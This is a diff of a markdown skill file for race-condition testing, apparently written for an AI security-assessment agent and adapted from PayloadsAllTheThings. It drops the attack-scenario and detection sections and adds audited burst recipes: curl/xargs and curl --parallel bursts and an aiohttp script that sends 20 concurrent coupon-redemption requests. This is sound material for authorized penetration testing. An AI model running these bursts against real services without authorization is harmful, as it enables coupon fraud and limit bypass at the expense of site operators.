@@ -1,5 +1,5 @@
 ---
-description: HTTP/2 single-packet, limit overrun, multi-endpoint race
+description: HTTP/2 single-packet, HTTP/1.1 last-byte sync, Turbo-Intruder-style gating, h2spacex, audited in-runtime burst recipes
 skill: race-condition-testing
 source: PayloadsAllTheThings — Race Condition
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -10,22 +10,9 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 > Source: PayloadsAllTheThings — Race Condition
 
-## Core Concepts
-
-Race conditions exploit timing windows where multiple concurrent requests can bypass server-side checks (balance verification, coupon limits, vote counts, rate limiters).
-
 ## HTTP/2 Single-Packet Attack
 
 Send 20-30 requests simultaneously in a single TCP packet, ensuring they arrive at the server at the exact same time.
-
-### Burp Suite (Repeater)
-
-```
-1. Create the request to repeat
-2. Duplicate it 20-30 times (Ctrl+R)
-3. Select all tabs -> right-click -> "Create tab group"
-4. Send group in parallel (single-packet attack)
-```
 
 ### Turbo Intruder (Burp Extension)
 
@@ -78,88 +65,52 @@ def queueRequests(target, wordlists):
 
 ## Common Attack Scenarios
 
-### Limit Overrun (Double Spending)
+- [ ] Account creation with unique constraints (email, username)
 
-```
-Target: POST /api/transfer
-Body: {"to": "attacker", "amount": 1000}
+## Running a burst through the audit pipeline
 
-Send 20 concurrent requests -> balance deducted once, credited 20 times
-```
-
-### Coupon / Gift Card Redemption
-
-```
-Target: POST /api/redeem
-Body: {"code": "DISCOUNT50"}
-
-Send 30 concurrent requests -> coupon applied multiple times
-```
-
-### Rate Limit Bypass (Brute Force)
-
-```
-Target: POST /api/login
-Body: {"user": "admin", "pass": "<bruteforce>"}
-
-Use single-packet attack with 20 different passwords per batch
--> bypasses "5 attempts per minute" rate limit
-```
-
-### 2FA Bypass
-
-```
-Target: POST /api/verify-otp
-Body: {"otp": "<value>"}
-
-Send 30 concurrent requests with different OTP values
--> bypasses "3 attempts" lockout
-```
-
-### Multi-Endpoint Race
-
-```
-Thread 1: POST /api/check-balance    (reads balance: $1000)
-Thread 2: POST /api/transfer         (sends $1000)
-Thread 3: POST /api/transfer         (also sends $1000 — balance not yet updated)
-```
-
-## Testing with curl
+Target traffic goes through one `vigil assess kali exec` call; the parallelism lives inside the
+runtime command, never as backgrounded host-side curls:
 
 ```bash
-# Use explicit Cookie/Auth headers here only when replaying a second session on purpose.
-# Simple parallel requests
+vigil assess kali exec --technique RACE-CONDITION --probe-kind payload --identity-env A=user_a \
+  --intent "20-way redeem burst (wide window)" --phase consume-test --timeout 120 -- bash -c '
+seq 1 20 | xargs -P 20 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST \
+  -b "$VIGIL_COOKIE_A" -H "Content-Type: application/json" \
+  -d "{\"code\":\"COUPON\"}" https://target.example/api/redeem | sort | uniq -c'
+```
+
+A curl/xargs burst spreads requests over milliseconds; it finds wide windows only. A negative from
+it is not conclusive: use the HTTP/2 single-packet or HTTP/1.1 last-byte technique above (h2spacex
+or a Turbo-Intruder-style gate) before closing the lead.
+
+Prepare N identical requests via curl config file (runtime curl, HTTP/2 multiplexing):
+
+```bash
+vigil assess kali exec --technique RACE-CONDITION --probe-kind payload --identity-env A=user_a \
+  --intent "20-way HTTP/2 multiplexed redeem burst" --phase consume-test --timeout 120 -- bash -c '
+# Create config file with 20 parallel POST requests
 for i in $(seq 1 20); do
-  curl -s -X POST http://target/api/redeem \
-    -H "Cookie: session=xxx" \
-    -d '{"code":"COUPON"}' &
-done
-wait
+  echo "url = https://target/redeem-coupon"
+  echo "request = POST"
+  echo "data = code=DISCOUNT50"
+  echo "cookie = \"$VIGIL_COOKIE_A\""
+  echo "next"
+done > /tmp/race_config.txt
+
+# Send all simultaneously via HTTP/2 multiplexing
+curl --parallel --parallel-max 20 -K /tmp/race_config.txt -o /dev/null -w "%{http_code}\n"'
 ```
 
-```bash
-# Using GNU parallel
-seq 1 50 | parallel -j50 curl -s -X POST http://target/api/transfer \
-  -H 'Cookie: session=xxx' \
-  -d '{"amount":100}'
-```
+Alternative: Python asyncio for precise timing (the runtime ships `python3-aiohttp`; run it as a
+probe script through `vigil assess kali exec … -- python3 <script>`,
+`agent/skills/write-probe-script/SKILL.md`):
 
-## Tools
-
-| Tool | Usage |
-|------|-------|
-| **Turbo Intruder** | Burp extension, gate-based synchronization |
-| **h2spacex** | Python library, HTTP/2 single-packet |
-| **racepwn** | Automated race condition testing |
-| **Burp Repeater** | Native parallel tab group feature |
-| **GNU parallel** | CLI-based concurrent requests |
-
-## Detection Tips
-
-```
-1. Look for TOCTOU patterns (Time of Check vs Time of Use)
-2. Test any endpoint with counters/limits/balances
-3. Compare: single request result vs 20 concurrent request results
-4. Check for inconsistencies in response (same ID returned twice, etc.)
-5. Monitor side effects: email sent twice, record created twice
+```python
+import asyncio, aiohttp
+async def race():
+    async with aiohttp.ClientSession() as s:
+        tasks = [s.post('https://target/redeem-coupon', data={'code':'DISCOUNT50'}) for _ in range(20)]
+        return await asyncio.gather(*tasks)
+asyncio.run(race())
 ```
